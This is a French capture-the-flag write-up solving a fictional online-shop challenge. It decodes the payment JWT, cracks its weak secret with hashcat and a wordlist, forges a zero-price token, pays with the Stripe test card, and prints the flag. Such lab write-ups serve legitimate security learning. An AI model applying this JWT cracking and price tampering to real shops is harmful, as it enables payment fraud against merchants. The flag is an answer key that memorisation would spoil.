# Faux et Usage de Faux (JWT Tampering)

**Flag :** `HSR{touj0urs_mi3ux_qu4nd_c_est_gratu1t!}`

---

## Table des matières

- [Contexte](#contexte)
- [Étape 1 - Analyse du token](#étape-1---analyse-du-token)
- [Étape 2 - Récupération de la clé secrète (brute-force)](#étape-2---récupération-de-la-clé-secrète-brute-force)
- [Étape 3 - Forge du token malveillant](#étape-3---forge-du-token-malveillant)
- [Étape 4 - Carte bancaire et validation](#étape-4---carte-bancaire-et-validation)
- [Résumé de la chaîne de résolution](#résumé-de-la-chaîne-de-résolution)

---

## Contexte

On accède à une boutique en ligne " Faux et Usage de Faux ". Le système utilise des JSON Web Tokens (JWT) pour gérer les sessions de paiement. Lors du clic sur " Payer plus tard ", un token est généré contenant le détail de la commande et le prix total. Un formulaire de carte bancaire est requis pour valider tout paiement.

---

## Étape 1 - Analyse du token

Ajouter l'article " Flag " (ID 42) au panier et générer un lien de paiement via " Payer plus tard ". Récupérer le token dans l'URL (`/pay?token=...`) et le décoder via [jwt.io](https://jwt.io) ou la console du navigateur.

On observe un payload du type :

```json
{
  "items": [{ "id": 42, "name": "Flag" }],
  "price": 1
}
```

Le serveur fait confiance au champ `price` du token sans le recalculer : c'est la faille. Comme l'article " Flag " est déjà dans le token, il suffit de modifier le `price`.

> **Note :** le bouton " Payer maintenant " ouvre un formulaire de carte bancaire mais retourne systématiquement " Une erreur est survenue lors du paiement ", même avec une carte valide. C'est une impasse volontaire.

---

## Étape 2 - Récupération de la clé secrète (brute-force)

La signature du JWT utilise une clé faible. On peut la casser avec Hashcat :

```bash
# Sauvegarder le token dans un fichier
echo "eyJhbG..." > jwt.txt

# Utiliser Hashcat avec le mode 16500 (JWT)
hashcat -m 16500 jwt.txt rockyou.txt
```

Résultat : la clé trouvée est `starlight`.

---

## Étape 3 - Forge du token malveillant

Créer un nouveau JWT via [jwt.io](https://jwt.io) avec le secret `starlight`. Comme l'article " Flag " (ID `42`) est déjà présent dans le token (ajouté au panier à l'étape 1), il suffit de modifier le champ `price` à `0` :

```json
{
  "items": [{ "id": 42, "name": "Flag" }],
  "price": 0
}
```

Signer le token avec l'algorithme HS256 et la clé `starlight`.

> **Note :** si le participant n'avait pas ajouté l'article " Flag " au panier, il faudrait aussi modifier le champ `items` pour y inclure `{ "id": 42, "name": "Flag" }`.

---

## Étape 4 - Carte bancaire et validation

Remplacer le token original dans l'URL par le token forgé. La page de paiement affiche un formulaire de carte bancaire. Le serveur n'accepte qu'une carte spécifique : la carte de test Stripe.

- Numéro : `4242 4242 4242 4242`
- Expiration : toute date supérieure à la date courante (ex : `12 / 30`)
- CVC : 3 chiffres quelconques (ex : `123`)

Si la carte n'est pas la bonne, le serveur répond " Carte non éligible. " sans plus de détail. La carte de test Stripe `4242 4242 4242 4242` est un standard bien connu dans le milieu du développement web.

Cliquer sur " Confirmer le paiement ". Le serveur valide le prix de 0 EUR et affiche le flag :

```
HSR{touj0urs_mi3ux_qu4nd_c_est_gratu1t!}
```

---

## Résumé de la chaîne de résolution

```
Faux et Usage de Faux (boutique en ligne)
  |
  |-- Ajouter "Flag" au panier + "Payer plus tard" -> token JWT dans l'URL
          |
          |-- Décoder le JWT -> champs "items" (déjà correct) et "price" visibles
                    |
                    |-- Hashcat (rockyou.txt) -> clé secrète "starlight"
                              |
                              |-- Forger un JWT avec price: 0 (items inchangés)
                                        |
                                        |-- Carte Stripe test (4242 4242 4242 4242)
                                                  |
                                                  |-- Confirmer le paiement -> flag
```
